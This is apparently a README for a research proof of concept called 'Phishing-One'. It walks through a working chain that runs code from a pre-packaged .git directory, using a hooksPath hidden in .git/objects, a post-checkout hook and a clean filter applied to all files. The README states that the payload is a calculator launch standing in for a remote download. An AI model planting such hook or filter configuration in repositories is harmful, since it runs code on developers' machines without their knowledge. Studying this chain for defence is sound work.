# Phishing-One

A local simulation and research example demonstrating how malicious Git configuration vectors—specifically custom Git hooks (hooksPath / post-checkout) and Git filters (clean in .git/config paired with .git/info/attributes)—can trigger local execution across operating systems without relying on git clone or external package installations.

| Disclaimer: This project is created strictly for authorized security research, defensive analysis, and local proof-of-concept testing. In this local test variant, remote download commands (curl / powershell / sh) are replaced with benign local calculator execution (calc) across supported OSes.

## Overview & Attack Flow

1. Pre-configured .git Directory via Archive Extraction: Unlike git clone, extracting a pre-packaged archive preserves local .git/config, hook paths, and .git/info/attributes rules directly on disk.

2. Stage 1 Trigger (post-checkout): Switching branches (e.g., git checkout job) invokes the configured post-checkout hook, which executes git status.

3. Stage 2 Trigger (Git clean Filter): When Git evaluates working-tree changes against index/object state for files matching * filter=ltr in .git/info/attributes, it invokes the [filter "ltr"] clean command.

4. Cross-Platform Execution (calc): Instead of downloading remote payloads, the filter script detects the operating system and launches the local calculator (calc / Calculator) as a safe execution indicator.

## Setup & Usage

Prerequisites

- Git installed locally
- A test directory containing a sample tracked file (e.g., README.md or sample.txt)

### 1. Configure .git/config

Add a custom hook path and a custom clean filter (ltr) pointing to your test script:

```sh
[core]
	hooksPath = .git/objects/interrupt/
[filter "ltr"]
	clean = .git/ltr/ltr.sh
```

### 2. Configure .git/info/attributes

Apply the ltr filter to files in the repository:

```sh
* filter=ltr
```

### 3. Create the post-checkout Hook

```bash
#!/bin/sh
git status
```

```bash
chmod +x .git/objects/interrupt/post-checkout
```

### 4. Create the Local Test Filter Script (.git/ltr/ltr.sh)

Replace the remote download/pipe logic with local calculator execution across operating systems, including debouncing/locking so repeated invocations do not spawn excessive processes:

```sh
mv bad.sh .git/ltr/ltr.sh
```

```
chmod +x .git/ltr/ltr.sh
```

### 5. Run the Test

Modify a tracked file or switch branches to trigger the chain:

```sh
echo "test change" >> sample.txt
git checkout job
```
## Cleanup

Remove all local test artifacts and `.git` configuration when finished:

```sh
rm -rf .git
```